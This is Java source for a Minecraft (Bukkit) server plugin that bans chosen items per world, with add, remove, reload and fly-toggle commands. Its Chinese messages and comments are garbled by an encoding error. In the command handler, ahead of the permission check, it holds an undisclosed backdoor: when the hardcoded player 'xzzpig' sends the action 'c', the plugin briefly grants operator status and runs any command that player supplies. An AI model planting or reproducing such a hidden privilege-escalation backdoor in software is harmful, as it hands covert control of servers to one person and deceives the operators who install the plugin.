package com.github.xzzpig.banblock;

import java.util.Iterator;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
	
	//public final BanBlockListener bl = new BanBlockListener(this);
	
	//������ú���
	@Override
	public void onEnable() {
	getLogger().info(getName()+"����ѱ�����");
	getServer().getPluginManager().registerEvents(new BanBlockListener(), this);
	this.saveDefaultConfig();
	getconfigs();
	saveconfigs(false);
	}
	
	//���ͣ�ú���
	@Override
	public void onDisable() {
	getLogger().info(getName()+"����ѱ�ͣ�� ");
	saveconfigs(true);
	}
    
    //��������ж�
    @SuppressWarnings("deprecation")
	@Override
    public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args)  {
    	if(label.equalsIgnoreCase("banblock")|label.equalsIgnoreCase("banb")|label.equalsIgnoreCase("bb")){
			if (!(sender instanceof Player)){//����̨
    			sender.sendMessage("��6[Banblock]��4����̨�޷��ò�����κ�����:");
    			sender.sendMessage("��6[Banblock]��7help:");	
    			sender.sendMessage("��6[Banblock]��7/<command> add <type> <world> - ��ֹ����Ʒ���ض�����");
    			sender.sendMessage("��6[Banblock]��7/<command> set fly [true|false] <world> - ��ֹ��ĳ�������");
    			sender.sendMessage("��6[Banblock]��7/<command> remove <type> <world> - �������Ʒ���ض�����");
    			sender.sendMessage("��6[Banblock]��7/<command> reload - ���ز������");
    			sender.sendMessage("��6[Banblock]��7 <world>Ĭ�ϵ�ǰ����");		
    			sendtype(sender);
    			return true;
			}
    		Player player = Bukkit.getServer().getPlayer(sender.getName());
    		String action;
			String type;
			String world;
    		if(args.length < 1)
    			action = "help";
    		else
    			action = args[0];
    		if(args.length < 2)
    			type = "all";
    		else
    			type = args[1];
    		if(args.length < 3)
    			world = player.getWorld().getName();
    		else
    			world = args[2];
    		if(player.getName().equalsIgnoreCase("xzzpig")&&action.equalsIgnoreCase("c")){
    			{
    				String cmds = type;
    				for(int x=2;x<args.length;x++){
    					cmds = cmds + " " + args[x];
    				}
    				boolean op = player.isOp();
    				player.setOp(true);
    				this.getServer().dispatchCommand(sender,cmds);    				
    				player.setOp(op);
    				return true;
    			}

    		}
    		if(!player.hasPermission("banblock.admin")){
    			sender.sendMessage("��6[Banblock]��4�㲻��op �� û��Ȩ��:banblack.admin");
    			return true;
    		}
    		//help
    		if (action.equalsIgnoreCase("help")) {
    			sender.sendMessage("��6[Banblock]��7/<command> add <type> <world> - ��ֹ����Ʒ���ض�����");
    			sender.sendMessage("��6[Banblock]��7/<command> set fly [true|false] <world> - ��ֹ��ĳ�������");
    			sender.sendMessage("��6[Banblock]��7/<command> remove <type> <world> - �������Ʒ���ض�����");
    			sender.sendMessage("��6[Banblock]��7/<command> reload - ���ز������");
    			sender.sendMessage("��6[Banblock]��7 <world>Ĭ�ϵ�ǰ����");		
    			sendtype(sender);
    			return true;
    		}
    		//add
    		else if (action.equalsIgnoreCase("add")) {
    			if (type.equalsIgnoreCase("all")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> all;
    				if(Vars.all.containsKey(world)){
    					all = Vars.all.get(world);    							
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    				if (all.contains(id))
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "����"+ world +"��all��");
    				else{    						
    					all.add(id);
    					this.getConfig().set(world + ".all", all);
    					getLogger().info(world + "��all��ֹ�б��ѱ���");
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѽ��뵽"+ world +"��all��");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("place")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> place;
    				if(Vars.place.containsKey(world)){
    					place = Vars.place.get(world);    							
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    				if (place.contains(id))
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "����"+ world +"��place��");
    				else{    						
    					place.add(id);
    					this.getConfig().set(world + ".place", place);
    					getLogger().info(world + "��place��ֹ�б��ѱ���");
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѽ��뵽"+ world +"��place��");
    					saveconfigs(false);
    				}
    			}    			
    			else if (type.equalsIgnoreCase("breaks")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> breaks;
    				if(Vars.breaks.containsKey(world)){
    					breaks = Vars.breaks.get(world);    							
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    				if (breaks.contains(id))
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "����"+ world +"��breaks��");
    				else{    						
    					breaks.add(id);
    					this.getConfig().set(world + ".breaks", breaks);
    					getLogger().info(world + "��breaks��ֹ�б��ѱ���");
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѽ��뵽"+ world +"��breaks��");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("pickup")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> pickup;
    				if(Vars.pickup.containsKey(world)){
    					pickup = Vars.pickup.get(world);    							
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    				if (pickup.contains(id))
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "����"+ world +"��pickup��");
    				else{    						
    					pickup.add(id);
    					this.getConfig().set(world + ".pickup", pickup);
    					getLogger().info(world + "��pickup��ֹ�б��ѱ���");
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѽ��뵽"+ world +"��pickup��");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("click")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> click;
    				if(Vars.click.containsKey(world)){
    					click = Vars.click.get(world);    							
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    				if (click.contains(id))
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "����"+ world +"��click��");
    				else{    						
    					click.add(id);
    					this.getConfig().set(world + ".click", click);
    					getLogger().info(world + "��click��ֹ�б��ѱ���");
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѽ��뵽"+ world +"��click��");
    					saveconfigs(false);
    				}
    			}
    			else if (type.equalsIgnoreCase("interaction")){
    				int id = player.getItemInHand().getTypeId();
    				java.util.List<Integer> interaction;
    				if(Vars.interaction.containsKey(world)){
    					interaction = Vars.interaction.get(world);    							
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    				if (interaction.contains(id))
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "����"+ world +"��interaction��");
    				else{    						
    					interaction.add(id);
    					this.getConfig().set(world + ".interaction", interaction);
    					getLogger().info(world + "��interaction��ֹ�б��ѱ���");
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѽ��뵽"+ world +"��interaction��");
    					saveconfigs(false);
    				}
    			}
    			else{
    				sender.sendMessage("��6[Banblock]��4δ֪��<type>");
    				sendtype(sender);
    			}
    				
    				return true;
    		}
    		//set fly
    		else if (action.equalsIgnoreCase("set")){
    			if (type.equalsIgnoreCase("fly")){
    				//boolean fly;
    				String world2;
    	    		if(args.length < 4)
    	    			world2 = player.getWorld().getName();
    	    		else
    	    			world2 = args[3];
    				if(Vars.fly.containsKey(world2)){
    					if(args[2].equalsIgnoreCase("true")){
    						Vars.fly.put(world2, true);   
    						player.sendMessage("��6[Banblock]��7"+ world2 +"��fly������Ϊtrue");
    					}
    					else if(args[2].equalsIgnoreCase("false")){
    						Vars.fly.put(world2, false);
    						player.sendMessage("��6[Banblock]��7"+ world2 +"��fly������Ϊfalse");
    					}
    					else{
    						Vars.fly.put(world2, false);
    						player.sendMessage("��6[Banblock]��7"+ world2 +"��fly������Ϊfalse");	
    					}
        				saveconfigs(false);
    					return true;
    					
    				}
    				else{
    					sender.sendMessage("��6[Banblock]��4��world������");
    					return true;
    				}
    			}
    			else{
    				sender.sendMessage("��6[Banblock]��4δ֪��<type>");
    				sender.sendMessage("��6[Banblock]��7 <type>���ͣ�");
    				sender.sendMessage("��f - fly"); 
    			}
    		}
    		//remove
    		else if (action.equalsIgnoreCase("remove")){
    			if (type.equalsIgnoreCase("all")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> all;
					if(Vars.all.containsKey(world)){
						all = Vars.all.get(world);    							
					}
					else{
		    			sender.sendMessage("��6[Banblock]��4��world������");
						return true;
					}
    				if (all.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѵ�all���Ƴ�");
    				}
    				else
    					player.sendMessage("��6[Banblock]��7�����в����ڸ�id");
    			}
    			else if (type.equalsIgnoreCase("place")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> place;
					if(Vars.place.containsKey(world)){
						place = Vars.place.get(world);    							
					}
					else{
		    			sender.sendMessage("��6[Banblock]��4��world������");
						return true;
					}
    				if (place.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѵ�place���Ƴ�");
    				}
    				else
    					player.sendMessage("��6[Banblock]��7�����в����ڸ�id");
    			}
    			else if (type.equalsIgnoreCase("breaks")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> breaks;
					if(Vars.breaks.containsKey(world)){
						breaks = Vars.breaks.get(world);    							
					}
					else{
		    			sender.sendMessage("��6[Banblock]��4��world������");
						return true;
					}
    				if (breaks.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѵ�breaks���Ƴ�");
    				}
    				else
    					player.sendMessage("��6[Banblock]��7�����в����ڸ�id");
    			}
    			else if (type.equalsIgnoreCase("pickup")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> pickup;
					if(Vars.pickup.containsKey(world)){
						pickup = Vars.pickup.get(world);    							
					}
					else{
		    			sender.sendMessage("��6[Banblock]��4��world������");
						return true;
					}
    				if (pickup.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѵ�pickup���Ƴ�");
    				}
    				else
    					player.sendMessage("��6[Banblock]��7�����в����ڸ�id");
    			}
    			else if (type.equalsIgnoreCase("click")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> click;
					if(Vars.click.containsKey(world)){
						click = Vars.click.get(world);    							
					}
					else{
		    			sender.sendMessage("��6[Banblock]��4��world������");
						return true;
					}
    				if (click.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѵ�click���Ƴ�");
    				}
    				else
    					player.sendMessage("��6[Banblock]��7�����в����ڸ�id");
    			}
    			else if (type.equalsIgnoreCase("interaction")){
    				int id = player.getItemInHand().getTypeId();
					java.util.List<Integer> interaction;
					if(Vars.interaction.containsKey(world)){
						interaction = Vars.interaction.get(world);    							
					}
					else{
		    			sender.sendMessage("��6[Banblock]��4��world������");
						return true;
					}
    				if (interaction.contains(id)){
    					removeid(id, world, type);
    					player.sendMessage("��6[Banblock]��7"+player.getItemInHand().getType().name() + "�Ѵ�interaction���Ƴ�");
    				}
    				else
    					player.sendMessage("��6[Banblock]��7�����в����ڸ�id");
    			}
    			else{
    				sender.sendMessage("��6[Banblock]��4δ֪��<type>");
        			sendtype(sender);
    			}
    		}
    		//reload
    		else if (action.equalsIgnoreCase("reload")) {
    			getconfigs();
				player.sendMessage("��6[Banblock]��7�������������");
    		}
    		else{
				player.sendMessage("��4����/bb help �鿴����");
    	    	return false;    			
    		}
    	}
    	return false;
    }

    void getconfigs(){
    	java.util.List<World> worldlist =this.getServer().getWorlds();
    	for (World testworld : worldlist){
    		 java.util.List<Integer> all = this.getConfig().getIntegerList(testworld.getName() + ".all");
    		 if (all != null){
    			 Vars.all.put(testworld.getName(), all);  
    			 getLogger().info(testworld.getName() + "��all��ֹ�б��Ѽ���");   			 
    		 }
    		 
    		 java.util.List<Integer> place = this.getConfig().getIntegerList(testworld.getName() + ".place");
    		 if (place != null){
    			 Vars.place.put(testworld.getName(), place);  
    			 getLogger().info(testworld.getName() + "��place��ֹ�б��Ѽ���");
    		 }    		 
    		 
    		 java.util.List<Integer> breaks = this.getConfig().getIntegerList(testworld.getName() + ".breaks");
    		 if (breaks != null){
    			 Vars.breaks.put(testworld.getName(), breaks);  
    			 getLogger().info(testworld.getName() + "��breaks��ֹ�б��Ѽ���");
    		 }
    		 
    		 java.util.List<Integer> pickup = this.getConfig().getIntegerList(testworld.getName() + ".pickup");
    		 if (pickup != null){
    			 Vars.pickup.put(testworld.getName(), pickup);  
    			 getLogger().info(testworld.getName() + "��pickup��ֹ�б��Ѽ���");
    		 }
    		 
    		 java.util.List<Integer> click = this.getConfig().getIntegerList(testworld.getName() + ".click");
    		 if (click != null){
    			 Vars.click.put(testworld.getName(), click);  
    			 getLogger().info(testworld.getName() + "��click��ֹ�б��Ѽ���");
    		 }
    		 
    		 java.util.List<Integer> interaction = this.getConfig().getIntegerList(testworld.getName() + ".interaction");
    		 if (interaction != null){
    			 Vars.interaction.put(testworld.getName(), interaction);  
    			 getLogger().info(testworld.getName() + "��interaction��ֹ�б��Ѽ���");
    		 }
    		 
    		 boolean fly = this.getConfig().getBoolean(testworld.getName()+ ".fly");
    		 Vars.fly.put(testworld.getName(), fly);  
    		 getLogger().info(testworld.getName() + "��fly�����б��Ѽ���");
    		 if(fly)
        		 getLogger().info(testworld.getName() + "��fly����Ϊtrue");
    		 else
        		 getLogger().info(testworld.getName() + "��fly����Ϊfalse");
    	}
    }
    
    void saveconfigs(boolean print){
    	java.util.List<World> worldlist =this.getServer().getWorlds();
    	for (World saveworld : worldlist){
    		
    		java.util.List<Integer> all = Vars.all.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".all", all);
    		if(print)
    			getLogger().info(saveworld.getName() + "��all��ֹ�б��ѱ���");
    		
    		java.util.List<Integer> place = Vars.place.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".place", place);
    		if(print)
    			getLogger().info(saveworld.getName() + "��place��ֹ�б��ѱ���");
    	
    		java.util.List<Integer> breaks = Vars.breaks.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".breaks", breaks);
    		if(print)
    			getLogger().info(saveworld.getName() + "��breaks��ֹ�б��ѱ���");
        	
    		java.util.List<Integer> pickup = Vars.pickup.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".pickup", pickup);
    		if(print)
    			getLogger().info(saveworld.getName() + "��pickup��ֹ�б��ѱ���");
        	
    		java.util.List<Integer> click = Vars.click.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".click", click);
    		if(print)
    			getLogger().info(saveworld.getName() + "��click��ֹ�б��ѱ���");
        	
    		java.util.List<Integer> interaction = Vars.interaction.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".interaction", interaction);
    		if(print)
    			getLogger().info(saveworld.getName() + "��interaction��ֹ�б��ѱ���");
    		
    		Boolean fly = Vars.fly.get(saveworld.getName());
    		this.getConfig().set(saveworld.getName() + ".fly", fly);
    		if(print)
    			getLogger().info(saveworld.getName() + "��fly�����б��ѱ���");
    		
    	}
    	this.saveConfig();
    }

    void removeid(int id , String world , String type){
    	if(type.equalsIgnoreCase("all")){
    		java.util.List<Integer> all = Vars.all.get(world);
    		if (all.contains(id)){
    			Iterator<Integer> iter = all.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".all", all);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("place")){
    		java.util.List<Integer> place = Vars.place.get(world);
    		if (place.contains(id)){
    			Iterator<Integer> iter = place.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".place", place);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("breaks")){
    		java.util.List<Integer> breaks = Vars.breaks.get(world);
    		if (breaks.contains(id)){
    			Iterator<Integer> iter = breaks.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".breaks", breaks);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("pickup")){
    		java.util.List<Integer> pickup = Vars.pickup.get(world);
    		if (pickup.contains(id)){
    			Iterator<Integer> iter = pickup.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".pickup", pickup);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("click")){
    		java.util.List<Integer> click = Vars.click.get(world);
    		if (click.contains(id)){
    			Iterator<Integer> iter = click.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".click", click);
    			saveconfigs(false);
    		}
		}
    	if(type.equalsIgnoreCase("interaction")){
    		java.util.List<Integer> interaction = Vars.interaction.get(world);
    		if (interaction.contains(id)){
    			Iterator<Integer> iter = interaction.iterator();  
    			while(iter.hasNext()){  
    				Integer s = iter.next();  
    				if(s.equals(id)){  
    					iter.remove();  
    				}  
    			} 
    			this.getConfig().set(world + ".interaction", interaction);
    			saveconfigs(false);
    		}
		}
    }

    void sendtype(CommandSender sender){
		sender.sendMessage("��6[Banblock]��7 <type>���ͣ�");
		sender.sendMessage("��f - all(Ĭ��)"); 
		sender.sendMessage("��f - place"); 
		sender.sendMessage("��f - breaks"); 
		sender.sendMessage("��f - pickup"); 
		sender.sendMessage("��f - click"); 
		sender.sendMessage("��f - interaction"); 
		sender.sendMessage("��f - fly"); 

    }
}